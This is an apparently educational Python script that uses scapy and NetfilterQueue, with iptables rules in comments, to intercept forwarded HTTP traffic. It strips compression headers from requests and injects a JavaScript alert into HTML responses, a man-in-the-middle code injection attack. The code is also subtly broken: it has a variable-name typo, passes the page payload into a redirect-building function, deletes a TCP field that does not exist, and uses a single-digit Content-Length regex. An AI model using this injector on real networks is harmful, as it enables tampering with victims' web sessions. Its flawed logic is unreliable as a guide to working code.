import re
import scapy.all as scapy
from netfilterqueue import NetfilterQueue


# Clear existing iptables rules
# iptables --flush
# Set up iptables rule to redirect FORWARD traffic to NetfilterQueue with queue number 0
# iptables -I FORWARD -j NFQUEUE --queue -num 0

ack_list = []  # List to store TCP acknowledgment numbers

# Function to modify packet payload and redirect to a specified URL
def set_load(packet, url_to_download):
    load = f'HTTP/1.1 301 Moved Permanently\nLocation: {url_to_download}\n\n'
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet

# Function to process intercepted packets
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    # Check if packet contains Raw layer (payload)
    if scapy_packet.haslayer(scapy.Raw):

        load = scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] Request')
            load = re.sub('Accept-Encoding:.?\\r\\n', "", load)
            
        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Response')
            print(scapy_paclet.show())

            injection_code =" <script> alert('you are hacked !!!!!!!!!!'); </script> "
            load = load.replace("</body>", f"{injection_code} </body>")

            content_length_search = re.search('(?:Content-Length:\s)(\d)', load)
            if content_length_search and 'text/html' in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str (new_content_length))


        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()
    
# Create a NetfilterQueue object and bind it to queue number 0, then run the queue
queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
 